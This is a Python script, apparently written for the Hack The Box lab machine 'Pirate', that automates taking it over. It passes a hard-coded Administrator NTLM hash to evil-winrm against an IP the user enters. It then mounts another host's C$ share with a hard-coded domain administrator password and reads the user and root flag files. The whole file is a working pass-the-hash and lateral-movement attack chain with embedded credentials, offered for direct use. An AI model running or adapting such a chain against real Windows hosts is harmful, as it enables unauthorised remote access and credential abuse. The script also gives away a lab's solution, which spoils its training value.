#!/usr/bin/env python3
"""
Auto Evil-WinRM - HTB Machine Auto Flags (Clean Version)
"""

import subprocess
import re
import time
import os

# Warna ANSI
BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
NC = '\033[0m'

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print(f"""
{BLUE}╔══════════════════════════════════════════════════════════════════╗
║                                                                 ║
║   ██████╗  █████╗ ███████╗ ██████╗ █████╗                         ║
║   ██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗                       ║
║   ██████╔╝███████║███████╗██║     ███████║                        ║
║   ██╔══██╗██╔══██║╚════██║██║     ██╔══██║                       ║
║   ██████╔╝██║  ██║███████║╚██████╗██║  ██║                        ║
║   ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝                        ║
║                                                                 ║
{GREEN}║        🇮🇩 ORANG SIBER INDONESIA 🇮🇩                             ║
{YELLOW}║       KEEP LEARNING & KEEP SHARING !!                           ║
{BLUE}║         HACK THE BOX - Machine Pirate                          ║
║          AUTOMATED ATTACK CHAIN                                ║
╚══════════════════════════════════════════════════════════════════╝{NC}

{YELLOW}[+] Created by: BASCA{NC}
{YELLOW}[+] Team: Orang Siber Indonesia{NC}
{YELLOW}[+] Box: HTB Pirate {NC}
{YELLOW}[+] Tools: Evil-WinRM Auto Flags{NC}
""")

def validate_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(pattern, ip):
        parts = ip.split('.')
        return all(0 <= int(part) <= 255 for part in parts)
    return False

def main():
    clear_screen()
    banner()
    print("="*60)
    
    # Input IP
    while True:
        ip = input(f"\n{YELLOW}[?]{NC} Input IP Target: ").strip()
        if validate_ip(ip):
            break
        print(f"{RED}[!]{NC} IP tidak valid!")
    
    # Konfigurasi
    username = 'Administrator'
    hash_value = '598295e78bd72d66f837997baf715171'
    target_ip = '192.168.100.2'
    target_user = 'pirate.htb\\Administrator'
    target_pass = 'gODNiUG69Mz77SIZ'
    user_file = 'a.white'
    
    print(f"\n{BLUE}[*]{NC} Target: {YELLOW}{ip}{NC}")
    print(f"{GREEN}[*]{NC} Extracting flags...\n")
    
    commands = [
        f'net use \\\\{target_ip}\\C$ /user:{target_user} {target_pass}',
        f'type \\\\{target_ip}\\C$\\Users\\{user_file}\\Desktop\\user.txt',
        'type C:\\Users\\Administrator\\Desktop\\root.txt',
        'exit'
    ]
    
    try:
        cmd = ['evil-winrm', '-i', ip, '-u', username, '-H', hash_value]
        
        process = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            bufsize=1
        )
        
        output = ""
        for command in commands:
            process.stdin.write(command + '\n')
            process.stdin.flush()
            time.sleep(0.5)
            
            while True:
                line = process.stdout.readline()
                if not line:
                    break
                output += line
                if '*Evil-WinRM*' in line:
                    break
        
        process.wait(timeout=10)
        
        # Extract flags
        flags = re.findall(r'[a-f0-9]{32}', output)
        
        print("\n" + "="*60)
        print(f"{GREEN}[✓] FLAGS FOUND:{NC}")
        print("="*60)
        
        if len(flags) >= 1:
            print(f"\n{GREEN}  📄 user.txt:{NC} {YELLOW}{flags[0]}{NC}")
        else:
            print(f"\n{RED}  ❌ user.txt not found{NC}")
            
        if len(flags) >= 2:
            print(f"{GREEN}  📄 root.txt:{NC} {YELLOW}{flags[1]}{NC}")
        else:
            print(f"{RED}  ❌ root.txt not found{NC}")
        
        print("\n" + "="*60)
        print(f"{GREEN}[+] Machine Complete!{NC}")
        print(f"{YELLOW}[+] Enjoy your flags!{NC}\n")
        
    except Exception as e:
        print(f"{RED}[!] Error: {e}{NC}")

if __name__ == "__main__":
    main()
